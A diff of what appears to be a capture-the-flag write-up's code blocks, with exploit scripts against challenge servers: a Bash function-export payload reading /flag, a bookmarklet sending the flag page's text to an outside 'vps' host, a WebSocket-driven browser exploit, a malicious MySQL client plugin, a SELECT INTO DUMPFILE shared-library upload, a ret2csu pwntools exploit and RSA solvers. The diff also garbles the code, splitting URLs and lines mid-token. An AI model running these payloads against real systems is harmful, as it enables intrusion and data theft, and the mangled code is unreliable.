@@ -11,20 +11,16 @@ payload = {
     "BASH_FUNC_env%%":(None,"() { cat /flag; exit; }"),
 }
 
-r = requests.post("http://123.60.84.229:10218/cgi-bin/hello",files=payload)
+r = requests.post("http://123.60.84.229:
+10218/cgi-bin/hello",files=payload)
 print(r.text)
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
   
 </head>
-<body>
-  <div id=logDiv></div>
+
+  
 
   <script>
     let exp = btoa(`
@@ -47,8 +43,10 @@ document.querySelector('button[type=submit]').click();
       console.log(msg)
       logDiv.innerText += msg + 'n'
     }
-    let WS_URL = 'ws://124.71.181.238:8081'
-    //WS_URL = 'ws://localhost:8081'
+    let WS_URL = 'ws://124.71.181.238:
+8081'
+    //WS_URL = 'ws://localhost:
+8081'
     const socket = new WebSocket(WS_URL)
     socket.onopen = () => {
         log('connected')
@@ -118,20 +116,10 @@ document.querySelector('button[type=submit]').click();
     }
   </script>
 
-</body>
+
 
 </html>
-```
-
-
-
-```
 javascript:s=q=>window.open('https://vps?q='+encodeURIComponent(q));s('start');w=window.open('/flag');setTimeout(()=>{s('timeout');s(w.document.body.innerText)},1000)
-```
-
-
-
-```
 TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 
 import socketserver, threading, requests, subprocess,time, base64, secrets,sys, hashlib, os
 import redis, secrets, re
@@ -204,14 +192,9 @@ def ftp_worker():
         while True:
             server.handle_request()
 threading.Thread(target=ftp_worker).start()
-```
-
-
-
-```
-#include <mysql/client_plugin.h>
-#include <mysql.h>
-#include <stdio.h>
+    #include <mysql/client_plugin.h>
+    #include <mysql.h>
+    #include <stdio.h>
 
 /*
 Ubuntu x86_64:
@@ -245,11 +228,6 @@ mysql_declare_client_plugin(AUTHENTICATION)
   NULL,                                 /* no option-handling function */
   evilplugin_client                    /* main function */
 mysql_end_client_plugin;
-```
-
-
-
-```
 import requests
 import random
 import string
@@ -258,7 +236,8 @@ import codecs
 def genName():
     return random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters)+ random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) +random.choice(string.ascii_letters)
 
-url = "http://124.71.205.170:10047/index.php"
+url = "http://124.71.205.170:
+10047/index.php"
 
 shell = open("exp.so","rb").read()
 n = 100
@@ -288,11 +267,6 @@ for idx in range(len(chunks)):
         sql = f"SELECT {x} INTO DUMPFILE '{name}'"
         r = requests.get(url,params={"key":"3", "value": sql})
         print(r.text)
-```
-
-
-
-```
 #!bin/bash
 
 mkdir 'out'
@@ -307,11 +281,6 @@ do
         break
     fi
 done
-```
-
-
-
-```
 let a = [240,188,218,205,188,154,138,200,207,33,26,246,30,136,124,38,241,178,193,127,163,161,72,140,187,16,19];
 let b = [177, 255, 142, 139, 199, 227, 202, 163, 186, 76, 91, 152, 65, 185, 15, 121, 152, 220, 162, 13, 198, 197, 36, 191, 215, 117, 110];
 let c = new Array(27);
@@ -319,11 +288,6 @@ for(var i = 0 ;i < 27; i++){
     c[i] = String.fromCharCode(a[i] ^ b[i]);        
 }
 alert(c.join(''));
-```
-
-
-
-```
 # opcode X
 # case 1
 for i in range(0x1000, 0x10000):
@@ -700,11 +664,6 @@ for i in range(0x1000, 0x10000):
     machine_code += " : "
     out = machine_code + "call field_A8[R0] ; 只有当 R0>=0 且 R0 <= 3 执行 field_A8处开始的四个函数的值，这四个函数在main 中被赋值到 field_A8 开始的指针"
     print(out)
-```
-
-
-
-```
 from pwn import *
 from random import choices
 import os
@@ -773,11 +732,6 @@ payload += func_ret2csu(name_addr + 8, name_addr, 0, 0)
 r.sendafter("Do you want to continue playing? [y/n]: ", payload)
 
 r.interactive()
-```
-
-
-
-```
 from Crypto.Util.number import *
 from gmpy2 import *
 
@@ -797,11 +751,6 @@ f = bytes_to_long(flag)
 d = invert(e,(p-1)*(q-1))
 print(long_to_bytes(pow(f,d,n)))
 # b'ACTF{F1nD1nG_5pEcia1_n_i5_nOt_eA5y}'
-```
-
-
-
-```
 # 中间相遇攻击
 dic = {}
 for i in tqdm(range(1,2**24)):
@@ -812,11 +761,6 @@ for i in tqdm(range(2**24)):
     t = pow(i,e,n0)
     if t in dic.keys():
         print(i,dic[t])
-```
-
-
-
-```
 from gmpy2 import *
 from tqdm import tqdm
 
@@ -854,11 +798,6 @@ d=gmpy2.invert(e,phi)
 m=pow(c,d,n)
 print(bytes.fromhex(hex(m)[2:]))
 # b'ACTF{lsb_attack_in_RSA|a32d7f}'
-```
-
-
-
-```
 [[0x000024AC, 0x00000116, 0x000004F4, 0x00000B64, 0x00001DC3, 0x00001B4A, 0x000001B2, 0x00001FCE, 0x00000E81, 0x000025AB, 0x0000015B, 0x0000252D, 0x000002AC, 0x00000F77, 0x000022F5, 0x000019E3, 0x00001C53, 0x00000B66, 0x000011BC, 0x0000193A],
 [0x00000DC6, 0x00000854, 0x000015F5, 0x00002567, 0x000008FA, 0x00000E20, 0x00000807, 0x00001007, 0x000018CC, 0x00001E84, 0x00001F11, 0x000013D4, 0x0000076A, 0x00001461, 0x00000B0F, 0x00001F70, 0x00001B3D, 0x00001008, 0x00000D52, 0x0000049A],
 [0x00001A89, 0x00000E42, 0x000000FA, 0x0000100D, 0x000014DD, 0x00001BFC, 0x000026DB, 0x00001AC2, 0x00001CA0, 0x000005ED, 0x00000834, 0x000016BF, 0x00000704, 0x00001FAD, 0x000025FD, 0x00001142, 0x00001EEE, 0x00001E60, 0x00000353, 0x000015A8],
@@ -869,12 +808,8 @@ print(bytes.fromhex(hex(m)[2:]))
 [0x00001675, 0x00000AA9, 0x00000D8B, 0x00000D31, 0x00001722, 0x000006C8, 0x0000151B, 0x000017D8, 0x00001FEF, 0x00001624, 0x00002307, 0x00000CB9, 0x0000053C, 0x00000230, 0x00001EAA, 0x00001FD1, 0x00000FAD, 0x00001E30, 0x00002345, 0x00001583],
 [0x000001D1, 0x0000056E, 0x00000AA3, 0x0000223C, 0x000009A4, 0x000006C9, 0x00000112, 0x00001977, 0x00002512, 0x00000B60, 0x0000081A, 0x00000F06, 0x00001329, 0x000011AA, 0x00002404, 0x00000E57, 0x0000011E, 0x000011DC, 0x00002474, 0x00001BC7],
 [0x000022BE, 0x00001F17, 0x00000588, 0x00001B80, 0x00001479, 0x000016EF, 0x000008CA, 0x00000D6E, 0x0000138F, 0x00001054, 0x000021FA, 0x00000102, 0x000013A6, 0x00000195, 0x000002D1, 0x00002594, 0x00001369, 0x00002534, 0x000015C5, 0x0000168A]]
-```
-
-
-
-```
-#_*_coding:utf-8_*_
+#_*_coding:
+utf-8_*_
 import base64
 data = [[0x000024AC, 0x00000116, 0x000004F4, 0x00000B64, 0x00001DC3, 0x00001B4A, 
         0x000001B2, 0x00001FCE, 0x00000E81, 0x000025AB, 0x0000015B, 0x0000252D, 
